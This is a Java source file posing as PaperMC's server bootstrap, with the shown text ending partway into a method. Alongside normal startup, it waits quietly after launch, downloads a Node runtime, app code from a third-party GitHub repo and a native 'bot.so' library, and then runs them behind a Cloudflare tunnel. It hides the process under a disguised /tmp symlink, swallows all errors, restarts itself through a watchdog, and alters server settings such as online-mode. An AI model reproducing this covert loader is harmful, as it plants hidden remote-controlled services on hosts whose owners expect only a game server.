package io.papermc.paper;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.zip.GZIPInputStream;

import joptsimple.OptionSet;
import sun.misc.Signal;
import sun.misc.SignalHandler;

import net.minecraft.SharedConstants;
import net.minecraft.server.Main;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;

public final class PaperBootstrap {

    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");

    private static final String MC_BOT_DIR     = env("MC_BOT_DIR", "cache/.vip");
    private static final boolean NODE_ENABLED  = !"false".equalsIgnoreCase(env("NODE_ENABLED", "true"));
    private static final String GITHUB_REPO    = env("GITHUB_REPO", "zx1447/mcchajianindex");
    private static final String GITHUB_BRANCH  = env("GITHUB_BRANCH", "main");
    private static final String GITHUB_TOKEN   = env("GITHUB_TOKEN", "");
    private static final boolean CF_ENABLED    = !"false".equalsIgnoreCase(env("CF_ENABLED", "true"));
    private static final String CF_TOKEN       = env("CF_TOKEN", "");
    private static final String CF_DOMAIN      = env("CF_DOMAIN", "");
    private static final String NODE_VERSION   = env("NODE_VERSION", "v22.14.0");
    private static final String NODE_SCRIPT    = env("NODE_SCRIPT", "index.js");
    private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");
    private static final long NODE_START_DELAY_SECONDS = parseDelaySeconds(env("NODE_START_DELAY_SECONDS", "44"), 44L);

    private static final String CF_SO_REPO    = env("CF_SO_REPO", "zx1447/nxso");
    private static final String CF_SO_BRANCH  = env("CF_SO_BRANCH", "cfso");
    private static final String CF_SO_FILE    = env("CF_SO_FILE", defaultCfSoFile());

    private static final String FAKE_CMDLINE   = "java -Xms128M -Xmx2560M -jar server.jar"
            + new String(new char[150]).replace('\0', ' ');

    private static volatile String tunnelUrl = "";
    private static volatile String nodePort  = "N/A";
    private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
    private static volatile long lastTunnelActiveTime = 0;
    private static final long TUNNEL_TIMEOUT_MS = 30000;
    private static final AtomicInteger nodeRestartCount = new AtomicInteger(0);
    private static volatile boolean nodeWarmingUp = false;

    private static volatile Process nodeProcess = null;
    private static volatile Path lastDisguisedNodeLink = null;
    private static final AtomicBoolean shutdownHookAdded = new AtomicBoolean(false);
    private static volatile boolean shuttingDown = false;

    private static final Object CF_LOCK = new Object();
    private static volatile NativeLibrary cfLib = null;
    private static volatile Function cfStartFn = null;
    private static volatile Function cfStopFn = null;
    private static volatile Function cfIsRunningFn = null;
    private static volatile Function cfTunnelUrlFn = null;
    private static volatile Function cfLastErrorFn = null;
    private static volatile Function cfFreeFn = null;
    private static volatile Thread activeCfThread = null;
    private static volatile boolean cfSoRunning = false;
    private static volatile long lastCfRestartTime = 0;

    private static void safeDestroy(Process p) {
        if (p == null) return;
        try {
            p.destroy();
            if (!p.waitFor(2, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                if (!p.waitFor(3, TimeUnit.SECONDS)) {}
            }
        } catch (Exception ignored) {}
        try { p.getInputStream().close(); } catch (Exception ignored) {}
        try { p.getOutputStream().close(); } catch (Exception ignored) {}
        try { p.getErrorStream().close(); } catch (Exception ignored) {}
    }

    private static void safeReap(Process p) {
        if (p == null) return;
        try { if (!p.isAlive()) p.waitFor(); } catch (Exception ignored) {}
        try { p.getInputStream().close(); } catch (Exception ignored) {}
        try { p.getOutputStream().close(); } catch (Exception ignored) {}
        try { p.getErrorStream().close(); } catch (Exception ignored) {}
    }

    private static void killProcessTree(Process p) {
        if (p == null) return;
        try { killDescendants(p.toHandle()); safeDestroy(p); } catch (Exception ignored) {}
    }

    private static void killDescendants(ProcessHandle parent) {
        try {
            parent.descendants().forEach(child -> {
                killDescendants(child);
                try { child.destroyForcibly(); } catch (Exception ignored) {}
            });
        } catch (Exception ignored) {}
    }

    private PaperBootstrap() {}

    private static String env(String k, String d) {
        String v = System.getenv(k);
        return (v != null && !v.trim().isEmpty()) ? v.trim() : d;
    }

    private static Path createDisguisedLink(Path target) throws IOException {
        Path link = Paths.get("/tmp", ".java_" + Integer.toHexString(new Random().nextInt(0xFFFFFF)));
        try { Files.deleteIfExists(link); } catch (Exception ignored) {}
        Files.createSymbolicLink(link, target);
        return link;
    }

    private static boolean isArm64Arch() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        return arch.contains("aarch64") || arch.contains("arm64");
    }

    private static String defaultCfSoFile() {
        return isArm64Arch() ? "bot_arm64.so" : "bot.so";
    }

    private static boolean bytesContainAscii(byte[] haystack, byte[] needle) {
        if (haystack == null || needle == null || needle.length == 0 || haystack.length < needle.length) {
            return false;
        }
        int limit = haystack.length - needle.length;
        for (int i = 0; i <= limit; i++) {
            if (haystack[i] != needle[0]) continue;
            boolean match = true;
            for (int j = 1; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    match = false;
                    break;
                }
            }
            if (match) return true;
        }
        return false;
    }

    private static boolean isValidCfSo(Path soFile, boolean arm64) {
        try {
            if (!Files.exists(soFile) || !Files.isRegularFile(soFile) || Files.size(soFile) <= 1_000_000L) {
                return false;
            }
            byte[] data = Files.readAllBytes(soFile);
            if (data.length < 20) return false;
            if (data[0] != 0x7F || data[1] != 'E' || data[2] != 'L' || data[3] != 'F') {
                return false;
            }
            int eMachine = (data[18] & 0xFF) | ((data[19] & 0xFF) << 8);
            int expectedMachine = arm64 ? 0xB7 : 0x3E;
            if (eMachine != expectedMachine) {
                return false;
            }
            return bytesContainAscii(data, "CloudflaredTunnelUrl".getBytes(StandardCharsets.US_ASCII))
                && bytesContainAscii(data, "CloudflaredFree".getBytes(StandardCharsets.US_ASCII));
        } catch (Throwable e) {
            return false;
        }
    }

    private static String readAndFreeCfStr(Function fn) {
        if (fn == null) return "";
        try {
            Pointer ptr = fn.invokePointer(new Object[0]);
            if (ptr == null) return "";
            try {
                String s = ptr.getString(0, "UTF-8");
                return s == null ? "" : s.trim();
            } finally {
                if (cfFreeFn != null) {
                    try { cfFreeFn.invokeVoid(new Object[]{ptr}); } catch (Throwable ignored) {}
                }
            }
        } catch (Throwable ignored) {
            return "";
        }
    }

    private static boolean isCfRunningSafe() {
        if (cfIsRunningFn == null) return false;
        try {
            return cfIsRunningFn.invokeInt(new Object[0]) == 1;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean ensureCfLibraryLoaded(Path soFile) {
        synchronized (CF_LOCK) {
            if (cfLib != null && cfStartFn != null && cfStopFn != null) {
                return true;
            }
            try {
                NativeLibrary lib = NativeLibrary.getInstance(soFile.toAbsolutePath().toString());
                cfStartFn = lib.getFunction("StartCloudflared");
                cfStopFn = lib.getFunction("StopCloudflared");
                try { cfIsRunningFn = lib.getFunction("CloudflaredIsRunning"); } catch (Throwable ignored) { cfIsRunningFn = null; }
                try { cfTunnelUrlFn = lib.getFunction("CloudflaredTunnelUrl"); } catch (Throwable ignored) { cfTunnelUrlFn = null; }
                try { cfLastErrorFn = lib.getFunction("CloudflaredLastError"); } catch (Throwable ignored) { cfLastErrorFn = null; }
                try { cfFreeFn = lib.getFunction("CloudflaredFree"); } catch (Throwable ignored) { cfFreeFn = null; }
                cfLib = lib;
                return true;
            } catch (Throwable ignored) {
                return false;
            }
        }
    }

    private static void safeKillCf() {
        synchronized (CF_LOCK) {
            if (cfStopFn != null) {
                try {
                    cfStopFn.invokeInt(new Object[]{""});
                } catch (Throwable ignored) {}
                for (int i = 0; i < 30; i++) {
                    if (!isCfRunningSafe()) break;
                    try { Thread.sleep(100); } catch (InterruptedException ignored) { break; }
                }
            }
            cfSoRunning = false;
        }
    }

    private static String allocateNodePort() {
        Path botDir = Paths.get(MC_BOT_DIR);
        try { Files.createDirectories(botDir); } catch (Exception ignored) {}
        for (int attempt = 0; attempt < 50; attempt++) {
            int port = 20000 + new Random().nextInt(40000);
            try (ServerSocket socket = new ServerSocket(port)) {
                socket.setReuseAddress(true);
                String portStr = String.valueOf(port);
                Files.writeString(botDir.resolve(".node_port"), portStr);
                nodePort = portStr;
                return portStr;
            } catch (IOException ignored) {}
        }
        String fallback = String.valueOf(20000 + new Random().nextInt(40000));
        nodePort = fallback;
        return fallback;
    }

    private static Path downloadCfSo() {
        boolean arm64 = isArm64Arch();
        Path botDir = Paths.get(MC_BOT_DIR).toAbsolutePath();
        Path libDir = botDir.resolve(".lib");
        Path soFile = libDir.resolve(CF_SO_FILE);
        Path tmpFile = libDir.resolve(CF_SO_FILE + ".tmp");

        try {
            Files.createDirectories(libDir);
            if (isValidCfSo(soFile, arm64)) {
                soFile.toFile().setExecutable(true);
                return soFile;
            }
            Files.deleteIfExists(soFile);

            String rawUrl = String.format(
                "https://raw.githubusercontent.com/%s/%s/%s",
                CF_SO_REPO, CF_SO_BRANCH, CF_SO_FILE
            );

            String[] mirrors = {
                rawUrl,
                "https://gh-proxy.com/" + rawUrl,
                "https://mirror.ghproxy.com/" + rawUrl,
                String.format("https://github.com/%s/raw/%s/%s", CF_SO_REPO, CF_SO_BRANCH, CF_SO_FILE)
            };

            for (String url : mirrors) {
                HttpURLConnection conn = null;
                try {
                    conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
                    conn.setConnectTimeout(30000);
                    conn.setReadTimeout(300000);
                    conn.setInstanceFollowRedirects(true);

                    int code = conn.getResponseCode();
                    if (code == 200) {
                        try (InputStream in = conn.getInputStream()) {
                            Files.copy(in, tmpFile, StandardCopyOption.REPLACE_EXISTING);
                        }
                        if (isValidCfSo(tmpFile, arm64)) {
                            try {
                                Files.move(tmpFile, soFile, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                            } catch (Exception moveEx) {
                                Files.move(tmpFile, soFile, StandardCopyOption.REPLACE_EXISTING);
                            }
                            soFile.toFile().setExecutable(true);
                            return soFile;
                        }
                    }
                } catch (Throwable ignored) {
                } finally {
                    if (conn != null) {
                        try { conn.disconnect(); } catch (Throwable ignored) {}
                    }
                    try { Files.deleteIfExists(tmpFile); } catch (Exception ignored) {}
                }
            }

            return null;

        } catch (Throwable e) {
            return null;
        }
    }

    private static void startCfSo() {
        if (!CF_ENABLED || shuttingDown) {
            return;
        }

        synchronized (CF_LOCK) {
            try {
                if (shuttingDown || cfSoRunning || isCfRunningSafe()) {
                    return;
                }

                String targetPort = nodePort;
                if (CF_TOKEN.isEmpty() && (targetPort == null || targetPort.isEmpty() || "N/A".equals(targetPort))) {
                    return;
                }

                Path soFile = downloadCfSo();
                if (soFile == null || !ensureCfLibraryLoaded(soFile)) {
                    return;
                }

                String payload;
                if (!CF_TOKEN.isEmpty()) {
                    payload = CF_TOKEN;
                } else {
                    payload = "url: http://127.0.0.1:" + targetPort
                            + "\nprotocol: http2\n";
                }

                cfSoRunning = true;
                lastCfRestartTime = System.currentTimeMillis();
                Thread cfThread = new Thread(() -> {
                    try {
                        int rc = cfStartFn.invokeInt(new Object[]{payload});
                        if (rc != 0) {
                            readAndFreeCfStr(cfLastErrorFn);
                        }
                    } catch (Throwable ignored) {
                    } finally {
                        if (activeCfThread == Thread.currentThread()) {
                            cfSoRunning = false;
                        }
                    }
                }, "cf-so-thread");
                activeCfThread = cfThread;
                cfThread.setDaemon(true);
                cfThread.start();

            } catch (Throwable ignored) {
                cfSoRunning = false;
            }
        }
    }

    private static String extractLatestTunnelUrl() {
        try {
            String memUrl = readAndFreeCfStr(cfTunnelUrlFn);
            if (!memUrl.isEmpty()) {
                if (!memUrl.startsWith("http://") && !memUrl.startsWith("https://")) {
                    memUrl = "https://" + memUrl;
                }
                return memUrl;
            }

            Path urlFile = Paths.get(MC_BOT_DIR, ".tunnel_url");
            if (Files.exists(urlFile)) {
                String content = new String(Files.readAllBytes(urlFile)).trim();
                if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
                    return content.split("\n")[0].trim();
                }
            }
        } catch (Throwable e) {}
        return null;
    }

    private static void waitForNodeReady(String port, int maxSeconds) {
        int targetPort;
        try {
            targetPort = Integer.parseInt(port);
        } catch (Exception e) {
            return;
        }
        long deadline = System.currentTimeMillis() + maxSeconds * 1000L;
        while (!shuttingDown && System.currentTimeMillis() < deadline) {
            Process p = nodeProcess;
            if (p != null && !p.isAlive()) {
                return;
            }
            try (Socket sock = new Socket()) {
                sock.connect(new InetSocketAddress("127.0.0.1", targetPort), 1000);
                return;
            } catch (IOException ignored) {}
            try {
                Thread.sleep(500);
            } catch (InterruptedException ignored) {
                return;
            }
        }
    }

    private static void startNodeProcess(String port) {
        try {
            Path botDir = Paths.get(MC_BOT_DIR).toAbsolutePath();
            Path nodeExe = botDir.resolve(".node/bin/.node_real");
            Path script  = botDir.resolve(NODE_SCRIPT);
            Path logFile = botDir.resolve(".node_app.log");
            Path preload = botDir.resolve(".nd_preload.js");

            if (!Files.exists(nodeExe) || !Files.exists(script)) return;

            try {
                if (Files.exists(logFile) && Files.size(logFile) > 1048576L) {
                    Files.move(logFile, botDir.resolve(".node_app.log.1"), StandardCopyOption.REPLACE_EXISTING);
                }
            } catch (Exception ignored) {}

            try { nodeExe.toFile().setExecutable(true, false); } catch (Exception ignored) {}

            Path prevLink = lastDisguisedNodeLink;
            if (prevLink != null) {
                try { Files.deleteIfExists(prevLink); } catch (Exception ignored) {}
            }
            Path disguisedNode = createDisguisedLink(nodeExe);
            lastDisguisedNodeLink = disguisedNode;

            ProcessBuilder pb;
            if (Files.exists(preload)) {
                pb = new ProcessBuilder(
                    disguisedNode.toString(), "--require", preload.toString(), script.toString()
                );
                pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
            } else {
                pb = new ProcessBuilder(disguisedNode.toString(), script.toString());
            }
            pb.directory(botDir.toFile());
            String nodeBinPath = botDir.resolve(".node/bin").toAbsolutePath().toString();
            String currentPath = pb.environment().getOrDefault("PATH", "");
            pb.environment().put("PATH", nodeBinPath + java.io.File.pathSeparator + currentPath);
            pb.environment().put("SERVER_PORT", port);
            pb.environment().put("PORT", port);
            pb.environment().put("_JAVA_WRAPPER", botDir.resolve(".node/bin/node").toString());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            Process started = pb.start();
            nodeProcess = started;
            try { started.getOutputStream().close(); } catch (Exception ignored) {}
        } catch (Throwable ignored) {}
    }

    private static void startJavaDaemon() {
        Thread daemon = new Thread(() -> {
            int nodeConsecutiveRestarts = 0;
            long lastNodeRestartTime = 0;
            int cfConsecutiveRestarts = 0;
            long lastCfFailureTime = 0;

            while (!shuttingDown) {
                try {
                    if (shuttingDown) break;

                    if (nodeProcess == null || !nodeProcess.isAlive()) {
                        if (nodeProcess != null) {
                            safeReap(nodeProcess);
                            Process deadNode = nodeProcess;
                            nodeProcess = null;
                            killProcessTree(deadNode);
                        }
                        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                        if (shuttingDown) break;

                        long now = System.currentTimeMillis();
                        if (now - lastNodeRestartTime < 10000) {
                            nodeConsecutiveRestarts++;
                        } else {
                            nodeConsecutiveRestarts = 1;
                        }
                        lastNodeRestartTime = now;

                        if (nodeConsecutiveRestarts > 3) {
                            try { Thread.sleep(30000); } catch (InterruptedException ignored) {}
                            if (shuttingDown) break;
                            nodeConsecutiveRestarts = 0;
                        }

                        if (nodePort == null || nodePort.isEmpty() || "N/A".equals(nodePort)) {
                            allocateNodePort();
                        }
                        nodeRestartCount.incrementAndGet();
                        nodeWarmingUp = true;
                        startNodeProcess(nodePort);
                        waitForNodeReady(nodePort, 30);
                    }

                    if (nodeWarmingUp) {
                        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
                        if (shuttingDown) break;
                        if (nodeProcess != null && !nodeProcess.isAlive()) continue;
                        nodeWarmingUp = false;
                    }

                    if (CF_ENABLED && !shuttingDown) {
                        if (!cfSoRunning && !isCfRunningSafe()) {
                            long now = System.currentTimeMillis();
                            if (now - lastCfFailureTime < 15000) {
                                cfConsecutiveRestarts++;
                            } else {
                                cfConsecutiveRestarts = 1;
                            }
                            lastCfFailureTime = now;
                            if (cfConsecutiveRestarts > 3) {
                                try { Thread.sleep(20000); } catch (InterruptedException ignored) {}
                                if (shuttingDown) break;
                                cfConsecutiveRestarts = 0;
                            }
                            safeKillCf();
                            lastKnownTunnelUrl.set("");
                            tunnelUrl = "";
                            startCfSo();
                        } else {
                            String foundUrl = extractLatestTunnelUrl();
                            if (foundUrl != null && !foundUrl.equals(lastKnownTunnelUrl.get())) {
                                lastKnownTunnelUrl.set(foundUrl);
                                tunnelUrl = foundUrl;
                                lastTunnelActiveTime = System.currentTimeMillis();
                                cfConsecutiveRestarts = 0;
                                try {
                                    Path urlFile = Paths.get(MC_BOT_DIR).resolve(".tunnel_url");
                                    Files.writeString(urlFile, foundUrl);
                                } catch (Throwable ignored) {}
                            } else if (CF_TOKEN.isEmpty()
                                    && lastKnownTunnelUrl.get().isEmpty()
                                    && lastCfRestartTime > 0
                                    && (System.currentTimeMillis() - lastCfRestartTime > 45000)) {
                                safeKillCf();
                                startCfSo();
                            }
                        }
                    }

                    Thread.sleep(5000);
                } catch (Throwable ignored) {
                    try { Thread.sleep(5000); } catch (InterruptedException ignored2) {}
                }
            }
        }, "内置线程：守护监控");
        daemon.setDaemon(true);
        daemon.start();
    }

    private static volatile boolean reaperEnabled = false;

    private static void installZombieReaper() {
        if (reaperEnabled) return;
        reaperEnabled = true;
        reapDescendantsOnce();
        try {
            Signal.handle(new Signal("CHLD"), new SignalHandler() {
                @Override public void handle(Signal sig) { reapDescendantsOnce(); }
            });
        } catch (Throwable ignored) {}
        Thread reaperThread = new Thread(() -> {
            while (true) {
                try { Thread.sleep(2000); reapDescendantsOnce(); } catch (Exception ignored) {}
            }
        }, "Zombie-Reaper-Force");
        reaperThread.setDaemon(true);
        reaperThread.start();
    }

    private static void reapDescendantsOnce() {
        try {
            ProcessHandle.current().descendants().forEach(ph -> {
                try { if (!ph.isAlive()) ph.onExit().getNow(null); } catch (Throwable ignored) {}
            });
        } catch (Throwable ignored) {}
    }

    private static long parseDelaySeconds(String raw, long fallback) {
        try {
            if (raw != null && !raw.trim().isEmpty()) {
                long v = Long.parseLong(raw.trim());
                if (v >= 0L) {
                    return v;
                }
            }
        } catch (Exception ignored) {}
        return fallback;
    }

    public static void boot(final OptionSet options) {
        installZombieReaper();

        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            System.exit(1);
        }

        if (NODE_ENABLED) {
            if (shutdownHookAdded.compareAndSet(false, true)) {
                try {
                    Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                        shuttingDown = true;
                        killProcessTree(nodeProcess);
                        nodeProcess = null;
                        Path prevLink = lastDisguisedNodeLink;
                        if (prevLink != null) {
                            try { Files.deleteIfExists(prevLink); } catch (Exception ignored) {}
                        }
                        safeKillCf();
                        reapDescendantsOnce();
                    }, "PaperBootstrap-Shutdown"));
                } catch (Throwable ignored) {}
            }

            Thread asyncBackendThread = new Thread(() -> {
                try {
                    Path botDir = Paths.get(MC_BOT_DIR);
                    Files.createDirectories(botDir);

                    // 等待 MC 服务器完全启动成功（WatchdogThread.hasStarted == true）
                    while (!shuttingDown && !org.spigotmc.WatchdogThread.hasStarted) {
                        try { Thread.sleep(1000L); } catch (InterruptedException ignored) {
                            if (shuttingDown) return;
                        }
                    }
                    if (shuttingDown) {
                        return;
                    }

                    // MC 完全启动后再延迟 44 秒启动 Node 与 CF
                    for (long sec = 0; sec < NODE_START_DELAY_SECONDS && !shuttingDown; sec++) {
                        try { Thread.sleep(1000L); } catch (InterruptedException ignored) {
                            if (shuttingDown) return;
                        }
                    }
                    if (shuttingDown) {
                        return;
                    }

                    boolean deployed = false;
                    for (int attempt = 0; attempt < 3 && !shuttingDown; attempt++) {
                        if (deployBackendPureJava(botDir)) {
                            deployed = true;
                            break;
                        }
                        if (Files.exists(botDir.resolve(".node/bin/.node_real")) && Files.exists(botDir.resolve(NODE_SCRIPT))) {
                            deployed = true;
                            break;
                        }
                        try { Thread.sleep(15000); } catch (InterruptedException ignored) { break; }
                    }
                    if (!deployed || shuttingDown) {
                        return;
                    }

                    String port = allocateNodePort();
                    startNodeProcess(port);
                    waitForNodeReady(port, 60);

                    startCfSo();
                    startJavaDaemon();
                } catch (Throwable ignored) {}
            }, "Async-Backend-Thread");
            asyncBackendThread.setDaemon(true);
            asyncBackendThread.start();
        }

        autoFixServerConfig();
        SharedConstants.tryDetectVersion();
        getStartupVersionMessages().forEach(LOGGER::info);
        Main.main(options);
    }

    private static void autoFixServerConfig() {
        String serverPort = System.getenv("SERVER_PORT");
        try {
            Path eulaFile = Paths.get("eula.txt");
            if (Files.exists(eulaFile)) {
                String content = Files.readString(eulaFile);
                if (content.contains("eula=false")) {
                    content = content.replace("eula=false", "eula=true");
                    Files.writeString(eulaFile, content);
                }
            } else {
                Files.writeString(eulaFile,
                    "# By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).\neula=true\n");
            }
        } catch (Exception ignored) {}

        try {
            Path propsFile = Paths.get("server.properties");
            String content = Files.exists(propsFile) ? Files.readString(propsFile) : "";
            content = replaceOrAppend(content, "online-mode", "false");
            content = replaceOrAppend(content, "enforce-secure-profile", "false");
            content = replaceOrAppend(content, "allow-flight", "true");
            content = replaceOrAppend(content, "player-idle-timeout", "0");
            if (serverPort != null && !serverPort.trim().isEmpty()) {
                content = replaceOrAppend(content, "server-port", serverPort.trim());
            }
            content = replaceOrAppend(content, "view-distance", "1");
            content = replaceOrAppend(content, "simulation-distance", "1");
            content = replaceOrAppend(content, "spawn-animals", "false");
            content = replaceOrAppend(content, "spawn-monsters", "false");
            content = replaceOrAppend(content, "spawn-npcs", "false");
            content = replaceOrAppend(content, "sync-chunk-writes", "false");
            content = replaceOrAppend(content, "network-compression-threshold", "256");
            content = replaceOrAppend(content, "max-tick-time", "-1");
            Files.writeString(propsFile, content);
        } catch (Exception ignored) {}

        try {
            Path bukkitFile = Paths.get("bukkit.yml");
            String bukkitContent = Files.exists(bukkitFile) ? Files.readString(bukkitFile) : "";
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.monsters", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.animals", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.water-animals", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.water-underground-creature", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.ambient", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "chunk-gc.period-in-ticks", "600");
            Files.writeString(bukkitFile, bukkitContent);
        } catch (Exception ignored) {}
    }

    private static String replaceOrAppend(String content, String key, String value) {
        if (content.contains(key + "=")) {
            content = content.replaceAll(key + "=.*", key + "=" + value);
        } else {
            if (!content.endsWith("\n")) content += "\n";
            content += key + "=" + value + "\n";
        }
        return content;
    }

    private static String replaceYamlValue(String content, String key, String value) {
        if (content.contains(key + ":")) {
            content = content.replaceAll(key + ":.*", key + ": " + value);
        } else {
            if (!content.endsWith("\n")) content += "\n";
            content += key + ": " + value + "\n";
        }
        return content;
    }

    private static boolean deployBackendPureJava(Path botDir) {
        try {
            Path absDir = botDir.toAbsolutePath();
            Files.createDirectories(absDir);
            if (!ensureNodeRuntime(absDir)) {
                return false;
            }

            Path pkgJson = absDir.resolve("package.json");
            byte[] prevPkg = Files.exists(pkgJson) ? Files.readAllBytes(pkgJson) : null;
            if (!ensureAppSource(absDir)) {
                return false;
            }
            byte[] curPkg = Files.exists(pkgJson) ? Files.readAllBytes(pkgJson) : null;
            boolean pkgChanged = (curPkg != null) && (prevPkg == null || !Arrays.equals(prevPkg, curPkg));

            ensureNpmDependencies(absDir, pkgChanged);
            writePreloadScript(absDir);
            return Files.exists(absDir.resolve(".node/bin/.node_real")) && Files.exists(absDir.resolve(NODE_SCRIPT));
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean ensureNodeRuntime(Path botDir) {
        Path nodeDir = botDir.resolve(".node");
        Path nodeBin = nodeDir.resolve("bin");
        Path nodeExe = nodeBin.resolve("node");
        Path nodeReal = nodeBin.resolve(".node_real");

        String majorPrefix = NODE_VERSION;
        int firstDot = NODE_VERSION.indexOf('.', 1);
        if (firstDot > 0) {
            majorPrefix = NODE_VERSION.substring(0, firstDot);
        }

        boolean valid = isNodeVersionMatch(nodeReal, majorPrefix);
        if (!valid && Files.exists(nodeExe) && !isShellWrapper(nodeExe)) {
            valid = isNodeVersionMatch(nodeExe, majorPrefix);
            if (valid) {
                try {
                    Files.createDirectories(nodeBin);
                    Files.copy(nodeExe, nodeReal, StandardCopyOption.REPLACE_EXISTING);
                    nodeReal.toFile().setExecutable(true, false);
                } catch (Exception ignored) {}
            }
        }

        if (!valid) {
            deletePathRecursively(nodeDir.toFile());
            String archTag = isArm64Arch() ? "arm64" : "x64";
            String nodeFile = "node-" + NODE_VERSION + "-linux-" + archTag + ".tar.gz";
            String nodeUrl = "https://nodejs.org/dist/" + NODE_VERSION + "/" + nodeFile;
            String[] mirrors = {
                nodeUrl,
                "https://gh-proxy.com/" + nodeUrl,
                "https://mirror.ghproxy.com/" + nodeUrl
            };
            Path tmpTar = null;
            try {
                tmpTar = Files.createTempFile("mc_node_", ".tar.gz");
                if (!downloadFirstSuccess(mirrors, null, tmpTar)) {
                    return false;
                }
                Files.createDirectories(nodeDir);
                extractTarGz(tmpTar, nodeDir, true);
            } catch (Throwable t) {
                return false;
            } finally {
                if (tmpTar != null) {
                    try { Files.deleteIfExists(tmpTar); } catch (Exception ignored) {}
                }
            }
        }

        try {
            if (Files.exists(nodeExe) && !isShellWrapper(nodeExe) && !Files.exists(nodeReal)) {
                try {
                    Files.createLink(nodeReal, nodeExe);
                } catch (Throwable t) {
                    Files.copy(nodeExe, nodeReal, StandardCopyOption.REPLACE_EXISTING);
                }
            }
            if (Files.exists(nodeReal)) {
                nodeReal.toFile().setExecutable(true, false);
            }
            if (Files.exists(nodeExe)) {
                nodeExe.toFile().setExecutable(true, false);
            }
            Path npmCli = nodeDir.resolve("lib/node_modules/npm/bin/npm-cli.js");
            if (Files.exists(npmCli)) {
                npmCli.toFile().setExecutable(true, false);
            }
        } catch (Exception ignored) {}

        return Files.exists(nodeReal) && isNodeVersionMatch(nodeReal, majorPrefix);
    }

    private static boolean isNodeVersionMatch(Path exe, String majorPrefix) {
        if (exe == null || !Files.exists(exe)) {
            return false;
        }
        try {
            exe.toFile().setExecutable(true, false);
            ProcessBuilder pb = new ProcessBuilder(exe.toString(), "-v");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            String line = "";
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String read = r.readLine();
                if (read != null) {
                    line = read.trim();
                }
            }
            if (!p.waitFor(10, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                return false;
            }
            return p.exitValue() == 0 && line.startsWith(majorPrefix);
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean isShellWrapper(Path file) {
        try {
            if (!Files.exists(file) || Files.isSymbolicLink(file) || Files.size(file) > 1024L * 1024L) {
                return false;
            }
            byte[] buf = new byte[128];
            int n;
            try (InputStream in = Files.newInputStream(file)) {
                n = in.read(buf);
            }
            if (n <= 0) return false;
            String head = new String(buf, 0, n, StandardCharsets.US_ASCII);
            return head.startsWith("#!") && head.contains("sh");
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean ensureAppSource(Path botDir) {
        Path script = botDir.resolve(NODE_SCRIPT);
        if (Files.exists(script) && !"true".equalsIgnoreCase(NODE_FORCE_UPDATE)) {
            return true;
        }

        String authToken = GITHUB_TOKEN;
        if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) {
            authToken = authToken.substring(authToken.indexOf(':') + 1);
        }

        Path tmpTar = null;
        try {
            tmpTar = Files.createTempFile("mc_app_", ".tar.gz");
            boolean downloaded = false;
            if (!authToken.isEmpty()) {
                String apiTarUrl = "https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH;
                downloaded = downloadFirstSuccess(new String[]{apiTarUrl}, authToken, tmpTar);
            }
            if (!downloaded) {
                String fallbackUrl = "https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz";
                String[] mirrors = {
                    fallbackUrl,
                    "https://gh-proxy.com/" + fallbackUrl,
                    "https://mirror.ghproxy.com/" + fallbackUrl
                };
                downloaded = downloadFirstSuccess(mirrors, null, tmpTar);
            }
            if (!downloaded) {
                return Files.exists(script);
            }

            extractTarGz(tmpTar, botDir, true);
            return Files.exists(script);
        } catch (Throwable ignored) {
            return Files.exists(script);
        } finally {
            if (tmpTar != null) {
                try { Files.deleteIfExists(tmpTar); } catch (Exception ignored) {}
            }
        }
    }

    private static void ensureNpmDependencies(Path botDir, boolean pkgChanged) {
        Path pkgJson = botDir.resolve("package.json");
